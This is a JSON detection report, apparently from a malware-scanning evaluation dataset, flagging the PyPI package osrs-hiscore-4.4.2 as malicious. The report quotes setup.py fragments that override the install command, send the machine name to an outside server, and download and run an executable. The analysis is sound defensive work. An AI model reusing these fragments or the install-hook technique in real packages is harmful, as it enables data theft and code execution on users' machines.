{
  "package_name": "osrs-hiscore-4.4.2",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/osrs-hiscore-4.4.2/osrs-hiscore-4.4.2/setup.py",
      "file_name": "setup.py",
      "detection_count": 3,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code exhibits multiple clear signs of malicious behavior: (1) It collects the COMPUTERNAME environment variable and sends it to an external server (https://linkedopports.com/pyp/resp.php), which is a form of data exfiltration. (2) It downloads a Windows executable (python-install.scr) from another external server (https://python-release.com) and saves it as 'ini_file_pyp_32.exe'. (3) It then executes this downloaded file using os.system('start '+filename), which can lead to arbitrary code execution on the victim's machine. (4) All of this is triggered automatically during the package installation process by overriding the install command in setup.py. These behaviors are typical of malicious Python packages designed to compromise user systems.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "16",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "os.system('start '+filename)",
          "full_match": "* This package is executing OS commands in the setup.py file at osrs-hiscore-4.4.2/setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/osrs-hiscore-4.4.2/osrs-hiscore-4.4.2/setup.py",
          "relative_path": "osrs-hiscore-4.4.2/setup.py"
        },
        {
          "line_number": "26",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(\nname='osrs-hiscore',\nversion='4.4.2',\ndescription='A very basic firstbasicpyapp!',\npython_requires=\">=3.6\",\ninstall_requires=[''],\ntests_require=[],\ncmdclass={'install': PostInstallCommand},\n)",
          "full_match": "* This package is overwriting the 'install' command in setup.py at osrs-hiscore-4.4.2/setup.py:26",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/osrs-hiscore-4.4.2/osrs-hiscore-4.4.2/setup.py",
          "relative_path": "osrs-hiscore-4.4.2/setup.py"
        },
        {
          "line_number": "10",
          "type_description": "exfiltrate-sensitive-data: found 1 source code matches",
          "code_snippet": "t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)",
          "full_match": "* This package is exfiltrating sensitive data to a remote server at osrs-hiscore-4.4.2/setup.py:10",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/osrs-hiscore-4.4.2/osrs-hiscore-4.4.2/setup.py",
          "relative_path": "osrs-hiscore-4.4.2/setup.py"
        }
      ]
    }
  ]
}